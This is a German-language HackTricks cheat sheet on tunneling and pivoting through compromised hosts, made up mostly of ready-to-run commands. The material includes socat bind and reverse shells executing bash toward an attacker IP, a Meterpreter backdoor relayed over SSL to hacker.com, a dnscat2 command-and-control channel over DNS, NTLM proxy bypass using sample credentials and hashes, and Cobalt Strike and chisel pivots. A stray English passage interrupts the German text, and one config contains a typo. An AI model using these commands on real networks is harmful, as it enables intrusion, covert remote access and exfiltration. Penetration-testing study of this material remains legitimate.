# Tunneling und Portweiterleitung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Nmap-Tipp

{% hint style="warning" %}
**ICMP**- und **SYN**-Scans können nicht über Sockenproxys getunnelt werden, daher müssen wir die **Ping-Erkennung deaktivieren** (`-Pn`) und **TCP-Scans** (`-sT`) spezifizieren, damit dies funktioniert.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafische Verbindung (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Lokaler Port-zu-Port

Öffnen Sie einen neuen Port im SSH-Server --> Anderer Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokaler Port --> Kompromittierter Host (SSH) --> Dritte\_Box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokaler Port --> Kompromittierter Host (SSH) --> Überall
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Umgekehrtes Port-Forwarding

Dies ist nützlich, um umgekehrte Shells von internen Hosts über eine DMZ auf Ihren Host zu erhalten:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Sie benötigen **Root-Zugriff auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss Root-Login erlauben:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Aktivieren Sie die Weiterleitung auf der Serverseite.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Setzen Sie eine neue Route auf der Client-Seite.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Sie können den gesamten Datenverkehr zu einem Teilnetzwerk über einen Host **tunneln**.\
Zum Beispiel, Weiterleitung des gesamten Datenverkehrs, der zu 10.10.10.0/24 geht.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Verbinden Sie sich mit einem privaten Schlüssel
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Sitzung) --> Dritte\_Box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) ist ein Internet-Protokoll, das zur Weiterleitung von Netzwerkverkehr zwischen einem Client und einem Server in einem Proxy-Server verwendet wird. Es ermöglicht dem Client, Verbindungen über den Proxy herzustellen, wodurch die wahre Identität des Clients verborgen wird. SOCKS kann für die Umgehung von Firewalls, das Anonymisieren des Datenverkehrs und das Tunneln von Verbindungen verwendet werden.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
### Tunneling and Port Forwarding

Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data into another protocol to create a secure communication channel. Port forwarding, on the other hand, is a technique that redirects a communication request from one address and port number combination to another while the data is in transit.

#### Tunneling

Tunneling can be used to bypass firewalls and access restricted networks. It creates a secure connection between the source and destination by encapsulating the data. Common tunneling protocols include SSH, VPN, and SSL/TLS.

#### Port Forwarding

Port forwarding is commonly used in NAT environments to allow external devices to access services on private networks. It can also be used in penetration testing to redirect traffic from one port to another for exploitation.

Both tunneling and port forwarding are essential techniques in networking and cybersecurity for ensuring secure and efficient data transfer.
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS-Proxy

Öffnen Sie einen Port im Teamserver, der auf allen Schnittstellen lauscht und verwendet werden kann, um den Datenverkehr durch den Beacon zu leiten.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team Server, und der Datenverkehr wird zum Team Server und von dort zum angegebenen Host:Port gesendet.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port lokal

{% hint style="warning" %}
In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Datenverkehr wird an den Cobalt Strike-Client** (nicht an den Team-Server) gesendet und von dort zum angegebenen Host:Port.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Sie müssen einen Webdatei-Tunnel hochladen: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Meißel

Sie können es von der Veröffentlichungsseite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen\
Sie müssen die **gleiche Version für Client und Server verwenden**

### Socken
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Portweiterleitung
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Umgekehrter Tunnel. Der Tunnel wird vom Opfer gestartet.\
Ein Socks4-Proxy wird auf 127.0.0.1:1080 erstellt.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot durch **NTLM-Proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind-Shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Umgekehrte Shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port-zu-Port über Socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter über SSL Socat

In diesem Abschnitt werden wir sehen, wie wir eine Meterpreter-Sitzung über eine SSL-verschlüsselte Verbindung mit Socat einrichten können.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Sie können einen **nicht authentifizierten Proxy** umgehen, indem Sie diese Zeile anstelle der letzten in der Konsole des Opfers ausführen:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh Konsole**

Zertifikate auf beiden Seiten erstellen: Client und Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbinde den lokalen SSH-Port (22) mit dem 443-Port des Angreifer-Hosts
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es ist wie eine Konsolenversion von PuTTY (die Optionen ähneln sehr einem ssh-Client).

Da dieses Binärfile auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung haben können. Anschließend leiten wir nur lokal zugängliche Ports zu einem Port auf unserer Maschine weiter:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Sie müssen ein lokaler Administrator sein (für jeden Port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sie müssen **RDP-Zugriff auf das System** haben.\
Herunterladen:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) aus dem Remote Desktop Service-Feature von Windows. DVC ist verantwortlich für das **Tunneln von Paketen über die RDP-Verbindung**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laden Sie auf Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** wie folgt:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Jetzt können wir uns über **RDP** mit dem **Opfer** verbinden, indem wir **`mstsc.exe`** verwenden, und wir sollten eine **Aufforderung** erhalten, die besagt, dass das **SocksOverRDP-Plugin aktiviert** ist und auf **127.0.0.1:1080** **hört**.

**Verbinden** Sie sich über **RDP** und laden Sie die `SocksOverRDP-Server.exe`-Binärdatei auf die Opfermaschine hoch und führen Sie sie aus:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Jetzt bestätigen Sie auf Ihrem Rechner (Angreifer), dass der Port 1080 lauscht:
```
netstat -antb | findstr 1080
```
Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) verwenden, **um den Datenverkehr durch diesen Port zu leiten.**

## Windows-GUI-Apps proxifizieren

Sie können Windows-GUI-Apps dazu bringen, über einen Proxy zu navigieren, indem Sie [**Proxifier**](https://www.proxifier.com/) verwenden.\
Unter **Profil -> Proxy-Server** fügen Sie die IP und den Port des SOCKS-Servers hinzu.\
Unter **Profil -> Proxifizierungsregeln** fügen Sie den Namen des zu proxifizierenden Programms und die Verbindungen zu den IPs hinzu, die Sie proxifizieren möchten.

## NTLM-Proxy-Umgehung

Das zuvor erwähnte Tool: **Rpivot**\
**OpenVPN** kann es auch umgehen, indem Sie diese Optionen in der Konfigurationsdatei festlegen:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Es authentifiziert sich gegen einen Proxy und bindet lokal einen Port, der an den externen Dienst weitergeleitet wird, den Sie angeben. Anschließend können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
Zum Beispiel, um Port 443 weiterzuleiten.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Jetzt, wenn Sie zum Beispiel den **SSH**-Dienst beim Opfer einstellen, um auf Port 443 zu lauschen. Sie können sich über den Angreiferport 2222 damit verbinden.\
Sie könnten auch einen **Meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer auf Port 2222 lauscht.

## YARP

Ein von Microsoft erstellter Reverse-Proxy. Sie finden ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root ist in beiden Systemen erforderlich, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von DNS-Abfragen zu tunneln.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laden Sie es hier herunter**](https://github.com/iagox86/dnscat2)**.**

Richtet einen C\&C-Kanal über DNS ein. Es benötigt keine Root-Berechtigungen.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Sie können [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) verwenden, um einen dnscat2-Client in PowerShell auszuführen:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Portweiterleitung mit dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Ändern des Proxychains DNS

Proxychains unterbricht den `gethostbyname`-libc-Aufruf und leitet die TCP-DNS-Anfrage durch den Socks-Proxy. Standardmäßig verwendet Proxychains den DNS-Server **4.2.2.2** (fest codiert). Um ihn zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer **Windows-Umgebung** befinden, könnten Sie die IP des **Domänencontrollers** festlegen.

## Tunnel in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP-Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

In beiden Systemen ist Root erforderlich, um Tunnelschnittstellen zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laden Sie es hier herunter**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) ist ein Tool, um Lösungen mit einem Befehl ins Internet zu bringen.**
*Expositions-URIs sehen so aus:* **UID.ngrok.io**

### Installation

- Erstellen Sie ein Konto: https://ngrok.com/signup
- Client-Download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Grundlegende Verwendungen

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Es ist auch möglich, bei Bedarf Authentifizierung und TLS hinzuzufügen.*

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Offenlegung von Dateien über HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Abhören von HTTP-Anfragen

*Nützlich für XSS, SSRF, SSTI ...*
Direkt von stdout oder im HTTP-Interface [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling interner HTTP-Dienste
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml einfaches Konfigurationsbeispiel

Es öffnet 3 Tunnel:
- 2 TCP
- 1 HTTP mit statischer Dateiausstellung von /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Andere Tools zum Überprüfen

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
